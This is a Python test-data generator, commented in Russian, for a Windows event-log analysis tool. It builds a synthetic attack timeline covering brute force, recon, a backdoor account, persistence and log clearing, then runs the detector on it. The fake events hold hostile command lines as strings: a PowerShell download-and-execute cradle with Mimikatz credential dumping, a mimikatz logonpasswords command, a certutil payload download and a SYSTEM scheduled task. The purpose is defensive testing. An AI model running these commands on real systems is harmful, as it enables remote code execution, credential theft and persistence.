"""
generate_test_data.py — Генератор тестовых событий
Создаёт синтетический набор событий, имитирующих реальный сценарий атаки,
и прогоняет их через анализатор для проверки работы инструмента.

Сценарий атаки:
1. Брутфорс учётной записи admin (серия неудачных входов)
2. Успешный вход после подбора пароля
3. Разведка (whoami, net user, ipconfig)
4. Создание нового пользователя backdoor
5. Добавление backdoor в группу администраторов
6. Запуск подозрительного PowerShell-скрипта
7. Установка вредоносной службы
8. Очистка журнала Security (заметание следов)
"""

import os
import sys
from datetime import datetime, timedelta, timezone

from correlator import EventCorrelator
from reporter import generate_html_report, generate_csv_report


def generate_attack_scenario() -> list[dict]:
    """
    Генерирует последовательность событий, имитирующих реальную атаку.
    Каждое событие — словарь в формате, который возвращает parser.py.
    """
    events = []
    base_time = datetime(2025, 3, 15, 2, 30, 0, tzinfo=timezone.utc)
    computer = "WORKSTATION-01"
    attacker_ip = "192.168.1.100"
    target_account = "admin"

    # ─── Фаза 1: Брутфорс (15 неудачных попыток за 8 минут) ───

    for i in range(15):
        t = base_time + timedelta(seconds=i * 32)
        events.append(make_event(
            event_id=4625,
            timestamp=t,
            channel="Security",
            computer=computer,
            provider="Microsoft-Windows-Security-Auditing",
            event_data={
                "TargetUserName": target_account,
                "TargetDomainName": "WORKSTATION-01",
                "Status": "0xc000006d",
                "FailureReason": "%%2313",
                "SubStatus": "0xc0000064",
                "LogonType": "3",
                "IpAddress": attacker_ip,
                "IpPort": str(49152 + i),
                "WorkstationName": "ATTACKER-PC",
            }
        ))

    # ─── Фаза 2: Успешный вход (пароль подобран) ───

    t = base_time + timedelta(minutes=9)
    events.append(make_event(
        event_id=4624,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "TargetUserName": target_account,
            "TargetDomainName": "WORKSTATION-01",
            "LogonType": "3",
            "IpAddress": attacker_ip,
            "IpPort": "49200",
            "WorkstationName": "ATTACKER-PC",
            "LogonProcessName": "NtLmSsp",
            "AuthenticationPackageName": "NTLM",
        }
    ))

    # ─── Фаза 3: Вход через RDP ───

    t = base_time + timedelta(minutes=11)
    events.append(make_event(
        event_id=4624,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "TargetUserName": target_account,
            "TargetDomainName": "WORKSTATION-01",
            "LogonType": "10",
            "IpAddress": attacker_ip,
            "IpPort": "49210",
        }
    ))

    # ─── Фаза 4: Разведка (серия команд) ───

    recon_commands = [
        ("whoami.exe", "whoami /all"),
        ("ipconfig.exe", "ipconfig /all"),
        ("net.exe", "net user"),
        ("net.exe", "net localgroup administrators"),
        ("systeminfo.exe", "systeminfo"),
        ("tasklist.exe", "tasklist /v"),
        ("netstat.exe", "netstat -ano"),
    ]

    for i, (proc, cmd) in enumerate(recon_commands):
        t = base_time + timedelta(minutes=13, seconds=i * 15)
        events.append(make_event(
            event_id=4688,
            timestamp=t,
            channel="Security",
            computer=computer,
            provider="Microsoft-Windows-Security-Auditing",
            event_data={
                "NewProcessName": f"C:\\Windows\\System32\\{proc}",
                "CommandLine": cmd,
                "SubjectUserName": target_account,
                "SubjectDomainName": "WORKSTATION-01",
                "TokenElevationType": "%%1936",
            }
        ))

    # ─── Фаза 5: Создание бэкдор-учётной записи ───

    t = base_time + timedelta(minutes=18)
    events.append(make_event(
        event_id=4720,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "TargetUserName": "backdoor",
            "TargetDomainName": "WORKSTATION-01",
            "SubjectUserName": target_account,
            "SubjectDomainName": "WORKSTATION-01",
            "TargetSid": "S-1-5-21-1234567890-1234567890-1234567890-1010",
        }
    ))

    # Активация учётной записи
    t = base_time + timedelta(minutes=18, seconds=5)
    events.append(make_event(
        event_id=4722,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "TargetUserName": "backdoor",
            "SubjectUserName": target_account,
        }
    ))

    # Сброс пароля
    t = base_time + timedelta(minutes=18, seconds=10)
    events.append(make_event(
        event_id=4724,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "TargetUserName": "backdoor",
            "SubjectUserName": target_account,
        }
    ))

    # ─── Фаза 6: Эскалация привилегий ───

    t = base_time + timedelta(minutes=19)
    events.append(make_event(
        event_id=4732,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "MemberName": "CN=backdoor,CN=Users,DC=workstation-01",
            "MemberSid": "S-1-5-21-1234567890-1234567890-1234567890-1010",
            "TargetUserName": "Administrators",
            "TargetDomainName": "Builtin",
            "TargetSid": "S-1-5-32-544",
            "SubjectUserName": target_account,
        }
    ))

    # ─── Фаза 7: Подозрительный PowerShell ───

    t = base_time + timedelta(minutes=22)
    events.append(make_event(
        event_id=4104,
        timestamp=t,
        channel="Microsoft-Windows-PowerShell/Operational",
        computer=computer,
        provider="Microsoft-Windows-PowerShell",
        event_data={
            "ScriptBlockText": (
                "IEX (New-Object Net.WebClient).DownloadString"
                "('http://192.168.1.100:8080/payload.ps1'); "
                "Invoke-Mimikatz -DumpCreds"
            ),
            "ScriptBlockId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        }
    ))

    # ─── Фаза 8: Запуск Mimikatz ───

    t = base_time + timedelta(minutes=23)
    events.append(make_event(
        event_id=4688,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "NewProcessName": "C:\\Temp\\mimikatz.exe",
            "CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            "SubjectUserName": target_account,
            "SubjectDomainName": "WORKSTATION-01",
        }
    ))

    # ─── Фаза 9: Установка вредоносной службы ───

    t = base_time + timedelta(minutes=25)
    events.append(make_event(
        event_id=7045,
        timestamp=t,
        channel="System",
        computer=computer,
        provider="Service Control Manager",
        event_data={
            "ServiceName": "WindowsUpdateHelper",
            "ImagePath": "C:\\Windows\\Temp\\svc_update.exe",
            "ServiceType": "user mode service",
            "StartType": "auto start",
            "AccountName": "LocalSystem",
        }
    ))

    # ─── Фаза 10: Использование certutil для загрузки ───

    t = base_time + timedelta(minutes=26)
    events.append(make_event(
        event_id=4688,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil -urlcache -split -f http://192.168.1.100/backdoor.exe C:\\Temp\\update.exe",
            "SubjectUserName": target_account,
        }
    ))

    # ─── Фаза 11: Создание запланированной задачи ───

    t = base_time + timedelta(minutes=27)
    events.append(make_event(
        event_id=4688,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "NewProcessName": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": "schtasks /create /tn \"WindowsUpdate\" /tr C:\\Temp\\update.exe /sc onlogon /ru SYSTEM",
            "SubjectUserName": target_account,
        }
    ))

    # ─── Фаза 12: Вход с явными учётными данными ───

    t = base_time + timedelta(minutes=28)
    events.append(make_event(
        event_id=4648,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Security-Auditing",
        event_data={
            "SubjectUserName": target_account,
            "TargetUserName": "backdoor",
            "TargetServerName": "FILE-SERVER",
            "IpAddress": attacker_ip,
        }
    ))

    # ─── Фаза 13: Очистка журнала (заметание следов) ───

    t = base_time + timedelta(minutes=35)
    events.append(make_event(
        event_id=1102,
        timestamp=t,
        channel="Security",
        computer=computer,
        provider="Microsoft-Windows-Eventlog",
        event_data={
            "SubjectUserName": target_account,
            "SubjectDomainName": "WORKSTATION-01",
        }
    ))

    # ─── Фоновый шум: обычные события ───

    normal_users = ["user01", "user02", "svc_backup"]
    for i in range(20):
        t = base_time + timedelta(minutes=i * 2)
        user = normal_users[i % len(normal_users)]
        events.append(make_event(
            event_id=4624,
            timestamp=t,
            channel="Security",
            computer=computer,
            provider="Microsoft-Windows-Security-Auditing",
            event_data={
                "TargetUserName": user,
                "LogonType": "2",
                "IpAddress": "127.0.0.1",
            }
        ))

    # Сортируем по времени
    events.sort(key=lambda e: e['timestamp'])
    return events


def make_event(event_id: int, timestamp: datetime, channel: str,
               computer: str, provider: str, event_data: dict) -> dict:
    """Создаёт событие в формате, совместимом с parser.py."""
    return {
        'event_id': event_id,
        'timestamp': timestamp,
        'channel': channel,
        'computer': computer,
        'provider': provider,
        'event_data': event_data,
        'raw_xml': f'<synthetic event_id="{event_id}" />',
    }


def main():
    from colorama import init, Fore, Style
    init(autoreset=True)

    print(f"""
{Fore.CYAN}      ╱╲                         ╱╲
      ╭───────────────────────────╮
      │───────{Fore.GREEN}██{Fore.CYAN}─────────{Fore.GREEN}██{Fore.CYAN}───────│
      │──────{Fore.GREEN}████{Fore.CYAN}───────{Fore.GREEN}████{Fore.CYAN}──────│
      │───────{Fore.GREEN}██{Fore.CYAN}─────────{Fore.GREEN}██{Fore.CYAN}───────│
      │─────────────{Fore.WHITE}▲{Fore.CYAN}─────────────│
      │──{Fore.WHITE}═══{Fore.CYAN}─────────────────{Fore.WHITE}═══{Fore.CYAN}──│
      ╰───────────────────────────╯
      ╭───── {Fore.WHITE}C A T W A T C H{Fore.CYAN} ─────╮
      ╰───────────────────────────╯{Style.RESET_ALL}
       {Fore.YELLOW}Анализ журналов событий Windows{Style.RESET_ALL}
      {Fore.YELLOW}на предмет подозрительной активности{Style.RESET_ALL}
""")

    # Генерируем события
    print(f"{Fore.CYAN}[1/3] Генерация тестового сценария атаки...{Style.RESET_ALL}")
    events = generate_attack_scenario()
    print(f"{Fore.GREEN}[✓] Создано событий: {len(events)}{Style.RESET_ALL}")

    # Подсчитаем состав
    attack_events = [e for e in events if e['event_data'].get('IpAddress') == '192.168.1.100'
                     or e['event_id'] in (1102, 7045, 4104, 4720, 4722, 4724, 4732)]
    normal_events = len(events) - len(attack_events)
    print(f"    Вредоносных событий: {len(attack_events)}")
    print(f"    Фоновый шум:        {normal_events}")

    # Анализ
    print(f"\n{Fore.CYAN}[2/3] Запуск анализа...{Style.RESET_ALL}")
    correlator = EventCorrelator(events)
    results = correlator.analyze()

    # Сводка
    summary = results['summary']
    print(f"\n{Fore.WHITE}{'─'*50}")
    print(f"  РЕЗУЛЬТАТЫ ТЕСТОВОГО АНАЛИЗА")
    print(f"{'─'*50}{Style.RESET_ALL}")
    print(f"  Всего событий:         {results['total_events']}")
    print(f"  Срабатываний:          {summary['total_alerts']}")
    print(f"  Инцидентов:            {summary['total_correlated']}")

    if summary['critical_count'] > 0:
        print(f"  {Fore.RED}CRITICAL: {summary['critical_count']}{Style.RESET_ALL}")
    if summary['high_count'] > 0:
        print(f"  {Fore.YELLOW}HIGH:     {summary['high_count']}{Style.RESET_ALL}")

    if summary.get('by_category'):
        print(f"\n  По категориям:")
        for cat, count in summary['by_category'].items():
            print(f"    • {cat}: {count}")

    # Генерация отчёта
    print(f"\n{Fore.CYAN}[3/3] Генерация отчёта...{Style.RESET_ALL}")

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_dir = os.path.join(script_dir, 'templates')

    html_path = "test_report.html"
    generate_html_report(results, html_path, template_dir)

    csv_path = "test_report.csv"
    generate_csv_report(results, csv_path)

    print(f"\n{Fore.GREEN}{'='*50}")
    print(f"  ТЕСТ ЗАВЕРШЁН УСПЕШНО")
    print(f"{'='*50}{Style.RESET_ALL}")
    print(f"  Открой {html_path} в браузере для просмотра отчёта.")


if __name__ == '__main__':
    main()